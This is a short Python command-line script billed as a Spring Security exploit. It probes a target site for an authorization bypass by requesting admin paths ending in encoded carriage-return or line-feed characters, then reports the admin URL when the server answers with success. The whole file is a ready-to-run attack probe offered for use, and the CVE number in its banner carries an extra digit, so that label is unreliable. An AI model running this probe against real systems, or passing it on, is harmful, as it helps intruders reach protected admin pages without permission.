import requests
import urllib3
import argparse
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_vuln(url):
    url = url.rstrip('/')
    adminurl = url + '/admin/%0d'
    r = requests.get(adminurl, timeout=20)
    
    if r.status_code==200:
        print(f"[+] Detected Vulnerability : True, Admin url : {adminurl}")
    else:
        adminurl = url + '/admin/%0a'
        r = requests.get(adminurl, timeout=20)
        if r.status_code==200:
            print(f"[+] Detected Vulnerability : True, Admin url : {adminurl}")
        else:
            print("[-] Not Vulnerable...")
if __name__ == "__main__":
    print("""
          
    =================================
          Spring Security
          CVE-2022-222978 Exploit
    =================================
    
          """)
    parser = argparse.ArgumentParser(description='Spring-Security Exploit')
    parser.add_argument('-u', help='target url', required=True)
    args = parser.parse_args()
    check_vuln(args.u)